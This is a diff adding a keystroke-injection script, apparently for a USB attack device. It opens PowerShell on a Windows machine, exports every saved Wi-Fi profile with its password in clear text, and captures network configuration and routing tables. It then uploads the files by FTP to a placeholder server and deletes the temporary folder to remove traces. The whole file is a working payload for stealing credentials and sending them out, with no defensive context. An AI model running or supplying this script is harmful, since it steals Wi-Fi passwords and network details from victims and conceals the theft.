@@ -1,0 +1,34 @@
+Delay 1000
+RunWin powershell
+Delay 7000
+PrintLine cd $ENV:UserProfile
+Delay 2000
+PrintLine mkdir tmp
+Delay 2000
+PrintLine cd tmp
+Delay 2000
+PrintLine netsh wlan export profile key=clear
+Delay 2000
+PrintLine ipconfig > ipc.txt
+Delay 2000
+PrintLine netstat -r > nr.txt
+Delay 2000
+PrintLine ftp
+Delay 2000
+PrintLine open IPSERVERFTP
+Delay 2000
+PrintLine USERNAME
+Delay 2000
+PrintLine PASSWORD
+Delay 2000
+PrintLine prompt
+Delay 2000
+PrintLine mput *.*
+Delay 2000
+PrintLine quit
+Delay 2000
+PrintLine cd ..
+Delay 2000
+PrintLine Remove-Item -Recurse -Force tmp
+Delay 2000
+PrintLine exit
